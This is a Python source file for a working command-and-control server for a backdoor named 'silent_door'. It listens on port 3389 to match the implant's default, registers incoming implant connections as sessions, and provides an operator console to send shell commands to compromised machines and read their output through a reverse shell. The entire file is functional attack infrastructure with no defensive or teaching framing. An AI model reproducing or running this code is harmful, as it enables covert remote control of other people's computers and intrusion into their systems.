"""
TCP C2 (Command & Control) Server for silent_door backdoor.

The backdoor client connects via TCP, sends a greeting, and then exposes
a reverse shell through the socket.  This server listens for those
incoming connections and provides an interactive operator console.

Usage:
    python3 server.py [--host HOST] [--port PORT]

Defaults match the values compiled into the backdoor (main.h):
    HOST  0.0.0.0   (listen on all interfaces)
    PORT  3389
"""

import argparse
import socket
import sys
import threading

# ── tuneable constants ────────────────────────────────────────────────────────

# Seconds to wait for the implant's initial banner after connecting
BANNER_TIMEOUT: float = 2.0

# Polling interval used by the receive-loop inside an interact session
RECV_LOOP_TIMEOUT: float = 0.5

# Polling interval for the server socket accept loop (allows clean shutdown)
ACCEPT_TIMEOUT: float = 1.0

# ── session registry ──────────────────────────────────────────────────────────

sessions: dict[int, dict] = {}   # id -> {"socket": sock, "addr": (ip, port)}
_sessions_lock = threading.Lock()
_next_id = 0


def _register_session(sock: socket.socket, addr: tuple) -> int:
    global _next_id
    with _sessions_lock:
        sid = _next_id
        _next_id += 1
        sessions[sid] = {"socket": sock, "addr": addr}
    return sid


def _remove_session(sid: int) -> None:
    with _sessions_lock:
        sessions.pop(sid, None)


# ── client handler (runs in its own thread) ───────────────────────────────────

def handle_client(sock: socket.socket, addr: tuple) -> None:
    sid = _register_session(sock, addr)
    print(f"\n[+] New connection: session {sid} from {addr[0]}:{addr[1]}")
    print("    Type 'sessions' to list active sessions, "
          "'interact <id>' to open a shell.\n> ", end="", flush=True)

    # Drain any initial banner sent by the implant ("Connection done!", etc.).
    # The socket—and the session entry—remain open after this function returns;
    # the connection stays alive until the operator calls `interact` or `kill`.
    sock.settimeout(BANNER_TIMEOUT)
    try:
        banner = sock.recv(4096)
        if banner:
            print(f"\n[session {sid}] banner: {banner.decode(errors='replace').strip()}")
    except (socket.timeout, OSError):
        pass
    finally:
        sock.settimeout(None)


# ── operator helpers ──────────────────────────────────────────────────────────

def list_sessions() -> None:
    with _sessions_lock:
        if not sessions:
            print("  (no active sessions)")
            return
        for sid, info in sessions.items():
            ip, port = info["addr"]
            print(f"  [{sid}] {ip}:{port}")


def interact(sid: int) -> None:
    with _sessions_lock:
        info = sessions.get(sid)
    if info is None:
        print(f"  Session {sid} not found.")
        return

    sock: socket.socket = info["socket"]
    ip, port = info["addr"]
    print(f"[*] Interacting with session {sid} ({ip}:{port}). "
          "Type 'background' to return to the main console.\n")

    # Receive output from the remote shell in a background thread
    stop_recv = threading.Event()

    def _recv_loop() -> None:
        sock.settimeout(RECV_LOOP_TIMEOUT)
        while not stop_recv.is_set():
            try:
                data = sock.recv(4096)
                if not data:
                    print("\n[-] Session closed by remote host.")
                    _remove_session(sid)
                    stop_recv.set()
                    break
                sys.stdout.write(data.decode(errors="replace"))
                sys.stdout.flush()
            except socket.timeout:
                continue
            except OSError:
                _remove_session(sid)
                stop_recv.set()
                break

    recv_thread = threading.Thread(target=_recv_loop, daemon=True)
    recv_thread.start()

    # Send commands typed by the operator
    try:
        while not stop_recv.is_set():
            try:
                cmd = input()
            except EOFError:
                break
            if cmd.strip().lower() == "background":
                break
            try:
                sock.sendall((cmd + "\n").encode())
            except OSError:
                print("[-] Failed to send – session may have closed.")
                _remove_session(sid)
                break
    finally:
        stop_recv.set()
        recv_thread.join(timeout=1.0)

    print("\n[*] Returned to main console.\n")


# ── main console loop ─────────────────────────────────────────────────────────

HELP_TEXT = """
Available commands:
  sessions          – list all active sessions
  interact <id>     – interact with session <id>
  kill <id>         – close session <id>
  help              – show this message
  exit / quit       – shut down the server
"""


def console_loop() -> None:
    print(HELP_TEXT)
    while True:
        try:
            line = input("> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down.")
            break

        if not line:
            continue

        parts = line.split()
        cmd = parts[0].lower()

        if cmd in ("exit", "quit"):
            print("[*] Shutting down.")
            break
        elif cmd == "help":
            print(HELP_TEXT)
        elif cmd == "sessions":
            list_sessions()
        elif cmd == "interact":
            if len(parts) < 2 or not parts[1].isdigit():
                print("  Usage: interact <session_id>")
            else:
                interact(int(parts[1]))
        elif cmd == "kill":
            if len(parts) < 2 or not parts[1].isdigit():
                print("  Usage: kill <session_id>")
            else:
                sid = int(parts[1])
                with _sessions_lock:
                    info = sessions.pop(sid, None)
                if info:
                    try:
                        info["socket"].close()
                    except OSError:
                        pass
                    print(f"  Session {sid} closed.")
                else:
                    print(f"  Session {sid} not found.")
        else:
            print(f"  Unknown command: '{cmd}'. Type 'help' for a list of commands.")


# ── TCP listener ──────────────────────────────────────────────────────────────

def start_listener(host: str, port: int) -> None:
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((host, port))
    server_sock.listen(10)
    server_sock.settimeout(ACCEPT_TIMEOUT)

    print(f"[*] TCP listener started on {host}:{port}")
    print("[*] Waiting for connections …\n")

    while True:
        try:
            client_sock, addr = server_sock.accept()
        except socket.timeout:
            continue
        except OSError:
            break

        t = threading.Thread(
            target=handle_client,
            args=(client_sock, addr),
            daemon=True,
        )
        t.start()


# ── entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="TCP C2 server for silent_door backdoor implants."
    )
    parser.add_argument(
        "--host",
        default="0.0.0.0",
        help="Address to bind (default: 0.0.0.0)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=3389,
        help="Port to listen on (default: 3389 – matches backdoor default)",
    )
    args = parser.parse_args()

    listener_thread = threading.Thread(
        target=start_listener,
        args=(args.host, args.port),
        daemon=True,
    )
    listener_thread.start()

    console_loop()
